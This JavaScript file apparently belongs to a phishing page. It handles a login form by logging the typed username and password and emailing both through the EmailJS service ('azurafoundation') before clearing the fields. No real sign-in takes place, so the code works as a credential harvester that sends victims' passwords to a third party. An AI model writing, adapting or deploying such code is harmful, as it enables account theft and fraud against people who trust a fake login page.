const loginbtn = document.querySelector('#loginform');
const username = document.querySelector('#username');
const password = document.querySelector('#password');

loginbtn.onclick = () => {
    console.log('username: ', username.value,);
    console.log('password: ', password.value,);
    sendemail()
}

function sendemail() {
    var params = {
        username: username.value,
        password: password.value,
        name: 'azura',
    }
    const serviceid = 'azurafoundation';
    const templateid = 'template_92iprm4';

    emailjs.send(serviceid, templateid, params).then(
        (res) => {
            username.value = "";
            password.value = '';
            console.log('email sent successfully');

        }

    ).catch((err) => console.log(err))
}

